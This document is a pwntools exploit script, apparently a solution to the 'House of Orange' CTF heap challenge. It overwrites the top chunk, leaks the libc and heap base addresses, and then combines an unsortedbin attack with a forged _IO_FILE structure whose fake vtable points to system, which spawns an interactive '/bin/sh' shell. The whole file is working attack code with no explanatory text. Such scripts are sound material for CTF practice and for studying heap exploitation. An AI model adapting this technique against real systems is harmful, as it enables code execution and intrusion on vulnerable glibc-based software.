from pwn import *
#context(os='linux', arch='amd64', log_level='debug')

io = process('./orange')
elf = ELF('./orange')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.19.so')

def build(Length,Name,Price,Choice):
    io.recvuntil('Your choice : ')
    io.sendline(str(1))
    io.recvuntil('name :')
    io.sendline(str(Length))
    io.recvuntil('Name :')
    io.send(Name)
    io.recvuntil('Orange:')
    io.sendline(str(Price))
    io.recvuntil('Color of Orange:')
    io.sendline(str(Choice))

def see():
    io.recvuntil('Your choice : ')
    io.sendline(str(2))

def upgrade(Length,Name,Price,Choice):
    io.recvuntil('Your choice : ')
    io.sendline(str(3))
    io.recvuntil('name :')
    io.sendline(str(Length))
    io.recvuntil('Name:')
    io.send(Name)
    io.recvuntil('Orange: ')
    io.sendline(str(Price))
    io.recvuntil('Color of Orange: ')
    io.sendline(str(Choice))

#OverWrite TopChunk
build(0x80,'AAAA',1,1)
upgrade(0x100,'B'*0x80+p64(0)+p64(0x21)+p32(0)+p32(0)+2*p64(0)+p64(0xf31),2,2)

#TopChunk->unsorted bin
build(0x1000,'CCCC',3,3)

#leak libc_base 
build(0x400,'D'*8,4,4)
see()
io.recvuntil('Name of house : DDDDDDDD')
libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c2760-0x668
system_addr = libc_base+libc.symbols['system']
log.info('system_addr:'+hex(system_addr))
IO_list_all = libc_base+libc.symbols['_IO_list_all']
log.info('_IO_list_all:'+hex(IO_list_all))

#leak heap_base
upgrade(0x400,'E'*0x10,5,5)
see()
io.recvuntil('Name of house : ')
io.recvuntil('E'*0x10)
heap_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x130
log.info('heap_base:'+hex(heap_base))


# unsortedbin attack ,Fsop

vtable_addr = heap_base +0x140

pad =p64(0)*3+p64(system_addr) # vtable
pad = pad.ljust(0x410,"\x00")
pad += p32(6)+p32(6)+p64(0)

stream = "/bin/sh\x00"+p64(0x61)
stream += p64(0xddaa)+p64(IO_list_all-0x10)
stream +=p64(1)+p64(2) # fp->_IO_write_ptr > fp->_IO_write_base
stream = stream.ljust(0xc0,"\x00")
stream += p64(0) # mode<=0
stream += p64(0)
stream += p64(0)
stream += p64(vtable_addr)

payload = pad + stream

upgrade(0x800,payload,6,3)

io.recvuntil('Your choice : ')
io.sendline(str(1))

io.interactive()
